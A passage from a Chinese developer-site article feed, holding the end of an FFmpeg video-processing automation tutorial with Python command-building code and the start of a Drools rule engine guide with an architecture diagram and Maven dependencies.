    <span class="hljs-comment"># ... (省略遍历 args 替换 -c:v, -preset, -crf 的循环逻辑</span>
    <span class="hljs-comment"># 核心是将 args 中的 -crf 23 替换为 [hw_param, mapped_value]</span>
    
    <span class="hljs-keyword">return</span> new_args, []
</code></pre>
<hr/>
<h2 data-id="heading-3">二、 中间素材处理：精确变速与 All-Intra</h2>
<p>在制作长视频时，我们经常需要将长素材切片、变速，最后再拼接。这里有两个核心痛点：<strong>拼接处的卡顿</strong>和<strong>变速后的时长不准</strong>。</p>
<h3 data-id="heading-4">1. 为什么用 <code>-g 1</code> (All-Intra)？</h3>
<p>如果视频包含 P  预测帧 和 B  双向预测帧 ，直接拼接容易导致花屏或时间轴错乱。
<strong>解决方案</strong>：在切片阶段，强制使用 <strong>All-Intra</strong> 模式（即每一帧都是关键帧）。</p>
<ul>
<li><strong>通用参数</strong>：<code>-g 1</code> (GOP size = 1)。这比 <code>-x264-params keyint=1</code> 更通用。</li>
<li><strong>编码器选择</strong>：推荐 <code>libx264</code>。虽然 <code>libx265</code> 压缩率高，但在 All-Intra 模式下体积优势不明显，且编码极慢，拼接兼容性不如 H.264。</li>
</ul>
<h3 data-id="heading-5">2. 精确时长的“三明治”法 (<code>tpad</code> + <code>setpts</code>)</h3>
<p>直接使用 <code>setpts</code> 变速，往往会导致最后一帧由于浮点数精度被丢弃，造成拼接黑场。
<strong>解决方案</strong>：先加尾巴 Padding ，再变速，最后切断。</p>
<p><strong>场景</strong>：截取片段，慢放 2 倍，精确控制输出时长。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 目标：慢放视频，且保证时长绝对精确，防止丢帧</span>
speed_factor = <span class="hljs-number">2.0</span> <span class="hljs-comment"># 慢放2倍 (PTS * 2)</span>
input_duration = <span class="hljs-number">5.0</span> <span class="hljs-comment"># 原始切片时长</span>
target_duration = input_duration * speed_factor <span class="hljs-comment"># 目标时长 10.0秒</span>

cmd = [
    <span class="hljs-string">'-i'</span>, <span class="hljs-string">'input.mp4'</span>,
    <span class="hljs-string">'-an'</span>, <span class="hljs-comment"># 去除音频，防止变速后音画不同步干扰</span>
    <span class="hljs-string">'-c:v'</span>, <span class="hljs-string">'libx264'</span>,
    <span class="hljs-string">'-g'</span>, <span class="hljs-string">'1'</span>, <span class="hljs-comment"># All-Intra，拼接神器</span>
    
    <span class="hljs-comment"># --- 滤镜链 ---</span>
    <span class="hljs-comment"># 1. tpad: 先在尾部复制最后一帧 0.1秒  作为安全缓冲 </span>
    <span class="hljs-comment"># 2. setpts: 将 (原视频 + padding) 整体拉伸</span>
    <span class="hljs-comment"># 结果：缓冲也被拉伸了，保证了最后有足够的数据供截取</span>
    <span class="hljs-string">'-vf'</span>, <span class="hljs-string">f'tpad=stop_mode=clone:stop_duration=0.1,setpts=<span class="hljs-subst">{speed_factor}</span>*PTS'</span>,
    
    <span class="hljs-comment"># --- 关键设置 ---</span>
    <span class="hljs-string">'-fps_mode'</span>, <span class="hljs-string">'vfr'</span>, <span class="hljs-comment"># 允许可变帧率，防止强行对齐导致卡顿</span>
    
    <span class="hljs-comment"># --- 输出截断 ---</span>
    <span class="hljs-comment"># 强制只输出目标时长，切掉多余的 padding</span>
    <span class="hljs-string">'-t'</span>, <span class="hljs-string">f'<span class="hljs-subst">{target_duration:<span class="hljs-number">.6</span>f}</span>'</span>, 
    <span class="hljs-string">'output_clip.mp4'</span>
]
</code></pre>
<hr/>
<h2 data-id="heading-6">三、 终极合并：音频、视频与字幕的复杂关系</h2>
<p>当我们将处理好的视频（无声）、配音文件（m4a）、字幕文件（srt/ass）合并时，需要处理 4 种复杂场景。</p>
<h3 data-id="heading-7">1. 常见陷阱</h3>
<ul>
<li><strong>Windows 路径转义</strong>：FFmpeg 滤镜 (<code>-vf subtitles=...</code>) 中，路径不能直接用 <code>C:\</code>，必须转义为 <code>C\:</code>，且路径分隔符最好用 <code>/</code>。</li>
<li><strong>流映射 (<code>-map</code>)</strong>：多输入源时，必须显式指定 <code>-map 0:v -map 1:a</code>，否则 FFmpeg 可能会错误地选择静音流。</li>
<li><strong>Copy 模式的参数污染</strong>：使用 <code>-c:v copy</code> 时，绝对不能加 <code>-crf</code>、<code>-preset</code> 或 <code>-fps_mode</code>，否则必报错。</li>
</ul>
<h3 data-id="heading-8">2. 健壮的合并逻辑代码</h3>
<p>这是可以直接用于生产环境的合并代码，涵盖了硬/软字幕及有/无配音的排列组合。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path

<span class="hljs-keyword">def</span> <span class="hljs-title function_">merge_media</span>(<span class="hljs-params">novoice_mp4, audio_file, subtitle_file, sub_type, output_path</span>):
    <span class="hljs-string">"""
    sub_type: 1/3 为硬字幕(烧录), 2/4 为软字幕(流)
    """</span>
    <span class="hljs-comment"># 1. 路径处理 (Windows 滤镜兼容性关键!)</span>
    <span class="hljs-comment"># subtitles='C\:/path/to/file.srt'</span>
    abs_sub = Path(subtitle_file).resolve().as_posix()
    vf_sub_path = abs_sub.replace(<span class="hljs-string">':'</span>, <span class="hljs-string">'\\:'</span>) 

    <span class="hljs-comment"># 2. 基础命令</span>
    cmd = [<span class="hljs-string">"ffmpeg"</span>, <span class="hljs-string">"-y"</span>, <span class="hljs-string">"-i"</span>, novoice_mp4]
    
    has_audio = <span class="hljs-literal">False</span>
    <span class="hljs-keyword">if</span> audio_file <span class="hljs-keyword">and</span> os.path.exists(audio_file):
        cmd.extend([<span class="hljs-string">"-i"</span>, audio_file])
        has_audio = <span class="hljs-literal">True</span>
        
    <span class="hljs-comment"># 如果是软字幕，需要作为输入流</span>
    <span class="hljs-keyword">if</span> sub_type <span class="hljs-keyword">in</span> [<span class="hljs-number">2</span>, <span class="hljs-number">4</span>]:
        cmd.extend([<span class="hljs-string">"-i"</span>, subtitle_file])

    <span class="hljs-comment"># 3. 场景分支构建</span>
    <span class="hljs-comment"># 场景 A: 硬字幕 (必须重编码)</span>
    <span class="hljs-keyword">if</span> sub_type <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>]:
        <span class="hljs-comment"># Map: 视频(0) + 音频(1,如有)</span>
        cmd.extend([<span class="hljs-string">'-map'</span>, <span class="hljs-string">'0:v'</span>])
        <span class="hljs-keyword">if</span> has_audio:
            cmd.extend([<span class="hljs-string">'-map'</span>, <span class="hljs-string">'1:a'</span>])
            
        cmd.extend([
            <span class="hljs-string">'-c:v'</span>, <span class="hljs-string">'libx264'</span>, <span class="hljs-comment"># 硬字幕无法 Copy</span>
            <span class="hljs-string">'-vf'</span>, <span class="hljs-string">f"subtitles='<span class="hljs-subst">{vf_sub_path}</span>'"</span>, <span class="hljs-comment"># 注意单引号包裹</span>
            <span class="hljs-string">'-c:a'</span>, <span class="hljs-string">'copy'</span> <span class="hljs-keyword">if</span> has_audio <span class="hljs-keyword">else</span> <span class="hljs-string">'none'</span>
        ])

    <span class="hljs-comment"># 场景 B: 软字幕 (MP4封装推荐 mov_text)</span>
    <span class="hljs-keyword">elif</span> sub_type <span class="hljs-keyword">in</span> [<span class="hljs-number">2</span>, <span class="hljs-number">4</span>]:
        <span class="hljs-comment"># Map: 视频(0) + 音频(1,如有) + 字幕(1或2)</span>
        cmd.extend([<span class="hljs-string">'-map'</span>, <span class="hljs-string">'0:v'</span>])
        <span class="hljs-keyword">if</span> has_audio:
            cmd.extend([<span class="hljs-string">'-map'</span>, <span class="hljs-string">'1:a'</span>, <span class="hljs-string">'-map'</span>, <span class="hljs-string">'2:s'</span>])
        <span class="hljs-keyword">else</span>:
            cmd.extend([<span class="hljs-string">'-map'</span>, <span class="hljs-string">'1:s'</span>]) <span class="hljs-comment"># 此时字幕是第2个输入(索引1)</span>

        cmd.extend([
            <span class="hljs-string">'-c:v'</span>, <span class="hljs-string">'copy'</span>, <span class="hljs-comment"># 软字幕视频流可以直接 Copy (速度快)</span>
            <span class="hljs-string">'-c:a'</span>, <span class="hljs-string">'copy'</span> <span class="hljs-keyword">if</span> has_audio <span class="hljs-keyword">else</span> <span class="hljs-string">'none'</span>,
            <span class="hljs-string">'-c:s'</span>, <span class="hljs-string">'mov_text'</span>
        ])

    <span class="hljs-comment"># 4. 通用参数与执行</span>
    cmd.extend([<span class="hljs-string">'-movflags'</span>, <span class="hljs-string">'+faststart'</span>])
    
    <span class="hljs-comment"># 只有在重编码(非copy)时才加 CRF/Preset</span>
    <span class="hljs-keyword">if</span> <span class="hljs-string">'-c:v'</span> <span class="hljs-keyword">in</span> cmd <span class="hljs-keyword">and</span> <span class="hljs-string">'copy'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> cmd[cmd.index(<span class="hljs-string">'-c:v'</span>)+<span class="hljs-number">1</span>]:
         cmd.extend([<span class="hljs-string">'-crf'</span>, <span class="hljs-string">'23'</span>, <span class="hljs-string">'-preset'</span>, <span class="hljs-string">'fast'</span>, <span class="hljs-string">'-fps_mode'</span>, <span class="hljs-string">'vfr'</span>])

    cmd.append(output_path)
    
    <span class="hljs-comment"># 执行 (subprocess)</span>
    <span class="hljs-comment"># tools.runffmpeg(cmd) </span>
</code></pre>
<hr/>
<h2 data-id="heading-9">四、 避坑指南</h2>
<h3 data-id="heading-10">Q1: 音频比视频短怎么办？</h3>
<ul>
<li><strong>方法 A (无损)</strong>：使用 <code>-c:a copy</code> 并指定 <code>-t &lt;视频时长&gt;</code>。FFmpeg 会在视频结束时截断，如果音频短，后面就是无声画面。</li>
<li><strong>方法 B (填充静音)</strong>：使用 <code>-c:a aac -af apad -shortest</code>。<code>apad</code> 会给音频无限补静音，<code>-shortest</code> 会在视频结束时停止。注意这需要重编码音频。</li>
</ul>
<h3 data-id="heading-11">Q2: 为什么慢放时画面抖动？</h3>
<ul>
<li><strong>原因</strong>：你在慢放时指定了 <code>-r 30</code> 或没有加 <code>-fps_mode vfr</code>。FFmpeg 为了凑齐帧率，复制了相同的帧。</li>
<li><strong>解决</strong>：在慢放且重编码时，务必加上 <strong><code>-fps_mode vfr</code></strong>，让 FFmpeg 保留原始时间戳信息，不进行强制对齐。</li>
</ul>
<h3 data-id="heading-12">Q3: <code>subprocess</code> 报错 "No such file" 但文件明明存在？</h3>
<ul>
<li><strong>原因</strong>：通常是列表构建错误。</li>
<li><strong>错误示例</strong>：<code>cmd = [..., "-vf", "subtitles=...", "-crf", "23"]</code> (没有错)。</li>
<li><strong>常见手误</strong>：<code>cmd = [..., "+faststart" "-crf", ...]</code> (少了个逗号，Python 把两个字符串连起来了)。</li>
<li><strong>检查</strong>：打印 <code>print(cmd)</code>，看是否有奇怪的合并项。</li>
</ul>
<hr/>
<h2 data-id="heading-13">结语</h2>
<p>视频处理自动化的核心在于<strong>对 FFmpeg 处理流逻辑的理解</strong>。通过标准化的硬件参数映射、All-Intra 的中间素材预处理、以及严谨的 Map 映射逻辑，我们可以构建出一个既高效又稳定的视频生产流水线。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Drools规则引擎实战指南]]></title>    <link>https://juejin.cn/post/7579906040537563182</link>    <guid>https://juejin.cn/post/7579906040537563182</guid>    <pubDate>2025-12-05T03:05:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579906040537563182" data-draft-id="7579917791764758555" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Drools规则引擎实战指南"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-05T03:05:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="雨中飘荡的记忆"/> <meta itemprop="url" content="https://juejin.cn/user/694547077666606"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Drools规则引擎实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547077666606/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    雨中飘荡的记忆
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:05:32.000Z" title="Fri Dec 05 2025 03:05:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Drools规则引擎实战指南：从入门到生产应用</h2>
<h3 data-id="heading-1">前言</h3>
<p>Drools是一个开源的业务规则管理系统（BRMS），基于Java开发，提供了强大的规则引擎能力。它将业务逻辑从代码中分离出来，使业务人员可以直接维护规则，提高了系统的灵活性和可维护性。本文将深入介绍Drools的核心概念和实战应用。</p>
<h3 data-id="heading-2">一、Drools核心架构</h3>
<h4 data-id="heading-3">1.1 整体架构图</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------------------------+</span>
<span class="hljs-operator">|</span>                    Drools Architecture                    <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>                                                          <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">------------------+      +------------------+          |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  Rules (DRL)     <span class="hljs-operator">|</span>      <span class="hljs-operator">|</span>  Fact Model      <span class="hljs-operator">|</span>          <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">-----------+   |      |  +-----------+   |          |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span> Rule <span class="hljs-number">1</span>    <span class="hljs-operator">|</span>   <span class="hljs-operator">|</span>      <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span> Java POJO <span class="hljs-operator">|</span>   <span class="hljs-operator">|</span>          <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span> Rule <span class="hljs-number">2</span>    <span class="hljs-operator">|</span>   <span class="hljs-operator">|</span>      <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span> Objects   <span class="hljs-operator">|</span>   <span class="hljs-operator">|</span>          <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span> Rule <span class="hljs-number">3</span>    <span class="hljs-operator">|</span>   <span class="hljs-operator">|</span>      <span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">-----------+   |          |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">-----------+   |      +--------+---------+          |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">--------+---------+               |                    |</span>
<span class="hljs-operator">|</span>           <span class="hljs-operator">|</span>                         <span class="hljs-operator">|</span>                    <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>           v                         v                    <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">--------+--------------------------+---------+         |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>         Knowledge Base (KieBase)           <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------+  |         |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  Compiled Rules <span class="hljs-operator">+</span> Patterns          <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------+  |         |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">--------+---------------------------------+  |         |</span>
<span class="hljs-operator">|</span>           <span class="hljs-operator">|</span>                                    <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>           v                                    <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">--------+---------------------------------+  |         |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>      Working Memory (KieSession)        <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------+  |  |         |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-keyword">Insert</span> Facts <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">Pattern</span> <span class="hljs-keyword">Match</span>   <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">Execute</span> Actions              <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------+  |  |         |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">------------------------------------------+  |         |</span>
<span class="hljs-operator">|</span>                                                <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">------------------------------------------+  |         |</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>           Agenda (Rule Execution)        <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  Rule1 [priority<span class="hljs-operator">=</span><span class="hljs-number">10</span>] <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">Execute</span>          <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>  Rule2 [priority<span class="hljs-operator">=</span><span class="hljs-number">5</span>]  <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">Execute</span>          <span class="hljs-operator">|</span>  <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span>  <span class="hljs-operator">+</span><span class="hljs-comment">------------------------------------------+  |         |</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----------------------------------------------------------+</span>
</code></pre>
<h4 data-id="heading-4">1.2 核心组件说明</h4>
<pre><code class="hljs language-lua" lang="lua">组件层次结构:

KieServices
    |
    +<span class="hljs-comment">-- KieContainer</span>
            |
            +<span class="hljs-comment">-- KieBase (Knowledge Base)</span>
                    |
                    +<span class="hljs-comment">-- KieSession (Working Memory)</span>
                            |
                            +<span class="hljs-comment">-- Facts (业务对象)</span>
                            +<span class="hljs-comment">-- Agenda (规则执行队列)</span>
</code></pre>
<h3 data-id="heading-5">二、快速开始</h3>
<h4 data-id="heading-6">2.1 Maven依赖配置</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- pom.xml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">drools.version</span>&gt;</span>8.44.0.Final<span class="hljs-tag">&lt;/<span class="hljs-name">drools.version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">spring.boot.version</span>&gt;</span>3.1.5<span class="hljs-tag">&lt;/<span class="hljs-name">spring.boot.version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- Drools核心依赖 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.drools<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>drools-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${drools.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.drools<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>drools-compiler<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${drools.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.drools<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>drools-mvel<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${drools.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Decision Table支持 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.drools<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>drools-decisiontables<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${drools.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Boot集成 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${spring.boot.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
